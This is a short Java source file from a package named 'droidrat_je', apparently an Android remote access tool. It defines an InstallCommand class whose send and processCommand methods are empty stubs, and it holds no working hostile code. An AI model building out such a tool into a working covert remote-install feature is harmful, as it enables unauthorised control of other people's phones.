package com.je_chen.droidrat_je.command.process.install;

import com.je_chen.droidrat_je.appinstall.InstallApp;
import com.je_chen.droidrat_je.command.process.CommandFather;
import com.je_chen.droidrat_je.command.process.CommandProcessInterface;

public class InstallCommand extends CommandFather implements CommandProcessInterface {

    private InstallApp installApp;

    public InstallCommand(){
        installApp = new InstallApp();
    }

    @Override
    public void send(String value) {

    }

    @Override
    public void processCommand(String command) {

    }
}
